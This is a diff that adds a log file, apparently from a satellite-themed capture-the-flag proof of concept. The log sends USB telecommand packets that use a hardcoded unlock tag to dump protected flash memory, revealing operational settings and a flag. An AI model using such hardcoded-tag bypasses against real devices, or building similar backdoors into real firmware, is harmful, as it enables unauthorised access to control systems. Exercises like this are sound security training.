@@ -1,0 +1,21 @@
+[   0.000] ========================================================================
+[   0.000] V0-09 FLASH_READ hardcoded unlock tag
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x0B via=usb AES  payload=a4000020c35a
+[   0.001] <-- TM apid=0x09 AES len=20
+[   0.001] --> TC apid=0x0B via=usb AES  payload=a50000201234
+[   0.002] <-- TM apid=0x09 AES len=20
+[   0.002] --> TC apid=0x0B via=usb AES  payload=a5000020c35a
+[   0.003] <-- TM apid=0x0B AES len=37
+[   0.003] --> TC apid=0x0B via=usb AES  payload=a5200020c35a
+[   0.004] <-- TM apid=0x0B AES len=37
+[   0.004] --> TC apid=0x0B via=usb AES  payload=a5400020c35a
+[   0.005] <-- TM apid=0x0B AES len=37
+[   0.005] --> TC apid=0x0B via=usb AES  payload=a5600020c35a
+[   0.006] <-- TM apid=0x0B AES len=35
+[   0.006] dumped blob (126 B):
+b'OPS:STORE_FORWARD=ENABLED\r\nOPS:PAYLOAD_WINDOW=0420Z\r\nMAINT:FLASH_WINDOW=A5:C35A\r'
+b'\nFLAG=PWNSAT{flash_window_store_and_forward}\r\n'
+[   0.006] ========================================================================
+[   0.006] POC OK
+[   0.006] ========================================================================
